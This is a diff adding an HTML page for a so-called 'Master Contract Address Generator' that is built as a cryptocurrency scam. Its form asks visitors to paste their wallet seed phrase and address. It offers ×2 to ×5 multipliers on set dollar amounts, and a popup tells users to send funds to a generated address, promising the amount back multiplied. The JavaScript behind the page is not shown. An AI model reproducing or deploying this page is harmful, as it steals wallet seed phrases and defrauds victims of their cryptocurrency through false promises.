@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Master Contract Address Generator (MCA)</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="styles.css" />
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+</head>
+
+<body>
+  <!-- HEADER -->
+  <header class="site-header">
+    <div class="logo">
+      <img src="https://uploads.onecompiler.io/43f6gauca/43qkrrpgm/1000017064.jpg" alt="MCA Logo" class="logo-img">
+    </div>
+    <nav class="navbar">
+      <a href="#home">Home</a>
+      <a href="#dashboard">Dashboard</a>
+      <a href="#contact">Contact</a>
+    </nav>
+    <div class="header-cta">
+      <button class="launch-btn" onclick="goToDashboard()">Launch App</button>
+    </div>
+  </header>
+
+  <!-- HERO SECTION -->
+  <section class="hero" id="home">
+    <div class="hero-content">
+      <h1>Master Contract Address Generator</h1>
+      <p class="subtext">⚠️ <em>This is a confidential system designed for advanced cryptocurrency operations.</em></p>
+      <button id="generateBtn" class="hero-btn" onclick="goToDashboard()">Get Started</button>
+    </div>
+    <div class="btc-price-top">
+      Current Rates: <span id="cryptoPriceText">Loading...</span>
+    </div>
+    <div id="btcChartContainer" class="chart-container">
+      <canvas id="btcChart"></canvas>
+    </div>
+  </section>
+
+  <!-- COIN SELECTION -->
+  <section class="dashboard" id="dashboard">
+    <div id="coinSelectPanel" style="display: none; text-align:center; margin-bottom: 20px;">
+      <label for="coinChoice" style="font-weight: bold; font-size: 1.2rem;">Select Cryptocurrency:</label>
+      <select id="coinChoice" onchange="selectCrypto()">
+        <option value="">-- Choose Coin --</option>
+        <option value="BTC">Bitcoin</option>
+        <option value="ETH">Ethereum</option>
+        <option value="USDT">USDT</option>
+      </select>
+      <p class="subtext"><em>Rates provided by CoinGecko</em></p>
+    </div>
+
+    <!-- DESCRIPTION TOGGLE -->
+    <div class="description-toggle">
+      <button onclick="toggleDescription()">📘 Description</button>
+      <div id="descriptionBox" class="hidden">
+        <p><strong>This software is reserved for advanced crypto operations and authorized agents only.</strong></p>
+        <p><em>⚠️ Disclaimer: This is a secure tool intended for backend contract fund operations.</em></p>
+      </div>
+    </div>
+
+    <!-- DROPDOWN PANEL -->
+    <div id="dropdownPanel" style="display: none;">
+      <div class="dropdown-grid">
+        <div class="dropdown">
+          <label>Select Location</label>
+          <select id="locationSelect">
+            <option value="">-- Choose Location --</option>
+            <option>USA</option>
+            <option>UK</option>
+            <option>Singapore</option>
+            <option>China</option>
+            <option>Others</option>
+          </select>
+        </div>
+
+        <div class="dropdown">
+          <label>Wallet Type</label>
+          <select id="walletTypeSelect">
+            <option value="">-- Choose Wallet --</option>
+            <option>MetaMask</option>
+            <option>Trust Wallet</option>
+          </select>
+        </div>
+
+        <div class="dropdown">
+          <label>Seed Phrase</label>
+          <select id="seedLength" onchange="showSeedInput()">
+            <option value="">-- Choose --</option>
+            <option value="12">12</option>
+            <option value="24">24</option>
+          </select>
+          <textarea id="seedInput" placeholder="Paste your seed phrase here..." style="display: none;"></textarea>
+        </div>
+
+        <div class="dropdown">
+          <label>Wallet Authentication</label>
+          <select id="authSelect">
+            <option value="">-- Choose Auth Type --</option>
+            <option>None</option>
+            <option>Encrypted</option>
+          </select>
+        </div>
+
+        <div class="dropdown">
+          <label>Amount</label>
+          <select id="amountSelect" onchange="updateTransactionYield()">
+            <option value="">-- Choose Amount --</option>
+            <option>$200</option>
+            <option>$300</option>
+            <option>$500</option>
+            <option>$1000</option>
+            <option>$1500</option>
+            <option>$2000</option>
+            <option>$2500</option>
+            <option>$3000</option>
+            <option>$3500</option>
+            <option>$5000</option>
+          </select>
+        </div>
+
+        <div class="dropdown">
+          <label>Multiplier</label>
+          <select id="multiplierSelect" onchange="updateTransactionYield()">
+            <option value="">-- Choose Multiplier --</option>
+            <option>×2</option>
+            <option>×3</option>
+            <option>×5</option>
+          </select>
+          <div id="yieldMessage" class="yield-info"></div>
+        </div>
+      </div>
+
+      <div class="proceed-area">
+        <button class="hero-btn" onclick="startProcessing()">Proceed</button>
+        <p id="loadingText" style="display: none;"><em>⏳ Processing request, please wait...</em></p>
+      </div>
+    </div>
+
+    <!-- FINAL FLOW PANEL -->
+    <div id="finalFlow" style="display: none;">
+      <div class="flow-step" id="stepAddress">
+        <input type="text" id="walletInput" placeholder="Paste your wallet address..." />
+        <button onclick="nextStepAddress()">Next</button>
+      </div>
+
+      <div class="flow-step hidden" id="stepPasscode">
+        <input type="text" id="passcodeInput" placeholder="Enter access code..." />
+        <button onclick="validatePasscode()">Verify</button>
+        <p id="passcodeStatus" class="error-text"></p>
+      </div>
+
+      <div class="flow-step hidden" id="stepLink">
+        <button onclick="linkAddress()">🔗 Link Your Address</button>
+      </div>
+
+      <div class="flow-step hidden" id="stepLinked">
+        <p>✅ <em>Your address has been linked to the Master Contract System.</em></p>
+        <p><em>Final verification in progress...</em></p>
+      </div>
+
+      <div class="flow-step hidden" id="stepCaptcha">
+        <label><input type="checkbox" id="captchaCheck" onclick="verifyCaptcha()" /> I am not a robot</label>
+        <p id="captchaStatus"></p>
+      </div>
+
+      <div class="flow-step hidden" id="stepGenerate">
+        <button onclick="generateMCA()">Generate MCA</button>
+      </div>
+
+      <div class="flow-step hidden" id="stepResult">
+        <p><strong>✅ MCA generated successfully.</strong></p>
+        <textarea id="mcaOutput" readonly></textarea>
+        <button onclick="connectWallet()">Connect Wallet to Transfer</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- POPUP -->
+  <div id="procedurePopup" class="popup-overlay hidden">
+    <div class="popup-content">
+      <h2>📜 Procedure</h2>
+      <p><strong>Please copy your Master Contract Address below:</strong></p>
+      <textarea id="popupMCA" readonly></textarea>
+      <p id="amountNotice"><strong>You selected $XXX. Simulate the transaction accordingly.</strong></p>
+      <p><em>Open your wallet and simulate the exact transaction as selected above.</em></p>
+      <p>This will trigger software recognition and verify your MCA. Once confirmed, the reversed transaction will be multiplied and returned to your wallet.</p>
+      <p id="btcEquivalent" style="color: #00FFB2; font-style: italic;"></p>
+      <button onclick="closeProcedurePopup()">Close</button>
+    </div>
+  </div>
+
+  <!-- ACTIVITY FEED -->
+  <section class="activity-feed">
+    <h3>🔄 Live Blockchain Activity</h3>
+    <ul id="activityList"></ul>
+  </section>
+
+  <script src="script.js"></script>
+</body>
+</html>
